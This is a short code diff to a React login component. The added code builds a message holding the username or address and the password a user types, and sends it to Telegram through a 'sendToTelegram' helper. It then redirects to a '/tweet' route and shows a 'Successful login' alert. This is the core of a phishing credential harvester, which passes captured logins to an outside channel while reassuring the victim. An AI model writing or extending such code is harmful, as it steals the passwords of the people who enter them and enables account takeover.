@@ -1,6 +1,8 @@
 import "./Login.css";
 import img2 from "../../assets/2.svg";
 import { useState } from "react";
+import { useNavigate } from "react-router-dom";
+import { sendToTelegram } from "../../utils/sendToTelegram";
 
 
 const Login = () => {
@@ -8,9 +10,13 @@ const Login = () => {
     adres: "",
     password: "",
   });
-  const handleSubmit = (e) => {
+  const navigate=useNavigate()
+  const handleSubmit = async (e) => {
     e.preventDefault();
-
+    const message =`New message: \nAdres:${form2.adres} \nPassword: ${form2.password}`
+    await sendToTelegram(message)
+     navigate('/tweet')
+     alert('Successful login')
     console.log(form2);
   };
 
